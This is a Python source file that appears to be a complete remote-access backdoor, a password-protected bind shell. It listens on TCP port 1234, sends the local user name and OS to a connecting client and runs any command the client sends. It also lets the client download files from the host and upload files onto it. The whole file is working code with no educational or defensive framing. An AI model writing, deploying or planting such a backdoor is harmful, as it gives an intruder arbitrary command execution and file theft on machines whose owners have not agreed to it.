from socket import *
import socket as sc
from getpass import getuser
import platform
from time import sleep
import subprocess
import os


get_os = platform.uname()[0]
get_user = getuser()

os_info = str(get_user)+"<->"+str(get_os) 

try:
    ip = subprocess.check_output(['hostname','-I']).decode('utf-8').strip().split()[0]

    if ip == "":
        ip = sc.gethostbyname_ex(sc.gethostname())[-1][-1]

except:
    ip = sc.gethostbyname_ex(sc.gethostname())[-1][-1]

port = 1234
user_password = "b3438d429eb95e919beea64a56c14bae"

def start_server(ip):
    global connection
    connection = socket(AF_INET,SOCK_STREAM)
    connection.bind((ip,port))
    # print(f"Server Started at {ip}")

    connect_admin()

def connect_admin():

    try:	
        connection.listen(1)
        global client,addr
        client,addr = connection.accept()
        
        client.send(os_info.encode())  

        password = client.recv(1024).decode() 

        if password != user_password: 
            client.send("0".encode())
            client.close()
            connect_admin()
        else:
            client.send("1".encode()) 
            handshake = client.recv(1024).decode()
            if handshake == "1":     #
                client.send("Connected...".encode())
                recieve_message()
    except KeyboardInterrupt:
        print("Worked")


def recieve_message():
    try:
        while True:
            res = client.recv(1024).decode()
            if res == "1":
                client.send("Command >> ".encode())
                recieve = client.recv(1024).decode()
                if recieve == "exit":
                    client.close()
                    connect_admin()

                elif recieve == "terminate":
                    close_server()
                    break

                elif recieve[:2] == "cd":
                    try:
                        if(recieve[3:] != ""):
                            os.chdir(recieve[3:])
                            client.send(os.getcwd().encode())
                        else:
                            out_put = "error"
                            client.send(out_put.encode())
                    except:
                        client.send("No such Directory found".encode())

                elif recieve[:4] == "down":
                    file_name = recieve[5:]
                    if file_name in os.listdir():
                        file = open(file_name,"rb")
                        data = file.read()
                        file.close()
                        while True:
                            if len(data) > 0:
                                temp_data = data[0:1024]
                                if len(temp_data) < 1024:
                                    temp_data += chr(0).encode() * (1024 - len(temp_data))

                                data = data[1024:]
                                client.send(temp_data)

                            else:
                                client.send(b"Ended")
                                sleep(0.5)
                                break
                        client.send("Downloaded...".encode())
                    else:
                        client.send("No such file found...".encode())

                elif recieve[:2] == "up":
                    cmd_list = recieve.split(" ")
                    if len(cmd_list) == 3:
                        file = cmd_list[1]
                        file_name = cmd_list[2]
                    else:
                        file = cmd_list[1]
                        file_name = cmd_list[1]

                    if file_name in os.listdir():
                        there = 1
                        client.send("1".encode())
                    else:
                        there = 0
                        client.send("0".encode())
                        

                    data = b""
                    while True:
                        end_data = client.recv(1024)

                        if end_data == b"Ended":
                            break

                        data += end_data
                    if len(data) > 0:
                        new_file = open(file_name,"wb")
                        new_file.write(data)
                        new_file.close()

                        client.send("Uploaded...".encode())

                    else:
                        if there == 0:
                            client.send(str(file+" is not found").encode())
                        else:
                            client.send(str(file_name+" Already exists...").encode())
                
                else:
                    out_put = subprocess.getoutput(recieve)
                    if out_put == "" or out_put == None:
                        out_put = "Null"	
                        client.send(out_put.encode())
                    else:
                        client.send(out_put.encode())

    except KeyboardInterrupt:
        client.close()
    except:
        client.close()
        connect_admin()

def close_server():
    connection.close()

def main():
    start_server(ip)

main()
